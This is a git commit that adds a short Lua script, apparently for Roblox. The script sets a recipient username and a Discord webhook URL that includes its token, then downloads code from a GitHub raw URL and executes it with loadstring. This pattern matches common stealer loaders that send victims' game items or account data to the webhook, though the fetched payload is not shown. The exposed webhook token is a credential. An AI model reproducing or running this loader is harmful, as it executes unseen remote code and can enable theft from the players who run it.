249d11db8640b9b920ba2d76abd6aebbf697df9c
giorgivars <118048305+giorgivars@users.noreply.github.com>
2023-04-09 18:19:18 +0400

    Create uwu.lua

---
+++ uwu.lua
@@ -0,0 +1,4 @@
+UserName = "wzvv"
+WebHook = "https://discord.com/api/webhooks/1086965628906246174/2a-pMcER9QIdLlRdEQK8Iq7D-i_8-Hj-SagphMJJwwCgk5LIXXsFNnTGqHGkgNSDeBWP"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/giorgivars/gucci/main/asf.lua", true))()
